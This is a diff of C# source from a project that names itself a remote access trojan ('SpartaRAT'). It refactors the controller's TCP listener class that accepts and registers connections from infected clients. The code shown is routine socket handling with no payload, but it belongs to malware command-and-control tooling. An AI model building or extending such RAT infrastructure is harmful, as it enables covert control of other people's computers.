@@ -11,53 +11,27 @@ using System.Windows.Forms;
 
 namespace RATserverSparta.Sockets
 {
-//@TODO!!!: Add class for: Create, Accept, NewClient - And to use Get parameter on ClientInstanceMap and ClientSocketMap
-//@TODO!!!: Add class for: Create, Accept, NewClient - And to use Get parameter on ClientInstanceMap and ClientSocketMap
-//@TODO!!!: Add class for: Create, Accept, NewClient - And to use Get parameter on ClientInstanceMap and ClientSocketMap
-//@TODO!!!: Add class for: Create, Accept, NewClient - And to use Get parameter on ClientInstanceMap and ClientSocketMap
-    public class Server
+    public class SocketAccept
     {
         public Dictionary<string, Client.Client> ClientInstanceMap = new Dictionary<string, Client.Client>();
-        public Dictionary<string, Socket> ClientSocketMap = new Dictionary<string, Socket>();
-        public delegate void NewConnection(Client.Client ClientClassInstance, Socket client);
+        public Dictionary<string, System.Net.Sockets.Socket> ClientSocketMap = new Dictionary<string, System.Net.Sockets.Socket>();
+        public delegate void NewConnection(Client.Client ClientClassInstance, System.Net.Sockets.Socket client);
         public event NewConnection OnNewConnection;
         private MainGUI GUI_Instance;
-        private Socket Socket;
 
-        public Server(MainGUI instance)
+        public SocketAccept(MainGUI instance)
         {
             this.GUI_Instance = instance;
             this.OnNewConnection += NewClient;
         }
 
-        public dynamic Create()
-        {
-            try
-            {
-                IPAddress IpAddress = IPAddress.Parse(this.GUI_Instance.HostValue.Text);
-                Socket Socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                IPEndPoint LocalEndPoint = new IPEndPoint(IpAddress, 81); //IpAddress, Port
-                Socket.Bind(LocalEndPoint);
-                MessageBox.Show("Server Created - " + IpAddress.ToString() + ":81" + 
-                    Environment.NewLine + "Notice: SpartaRAT allow listening to one ip address");
-                this.Socket = Socket;
-                Socket.Listen(100);
-                return true;
-            }
-            catch
-            {
-                MessageBox.Show("Please select a host ip address at the Settings");
-                return false;
-            }
-        }
-
-        public void Accept()
+        public void Accept(System.Net.Sockets.Socket Socket)
         {
             while(true)
             {
                 try
                 {
-                    Socket client = Socket.Accept();
+                    System.Net.Sockets.Socket client = Socket.Accept();
                     //Main class communication instance:
                     Client.Client ClientClassInstance = new Client.Client(GUI_Instance, client);
                     OnNewConnection.Invoke(ClientClassInstance, client);
@@ -67,8 +41,8 @@ namespace RATserverSparta.Sockets
         }
 
 
-        //This delegate being used at the MainGUI class instance, to know when to create logs and add a listview items.
-        private void NewClient(Client.Client ClientClassInstance, Socket client)
+        //This delegate being used as event handler at MainGUI class and At SocketAccept class
+        private void NewClient(Client.Client ClientClassInstance, System.Net.Sockets.Socket client)
         {
             //Invoking the GUI Instance class which running on different Thread:
             this.GUI_Instance.Invoke((MethodInvoker)delegate
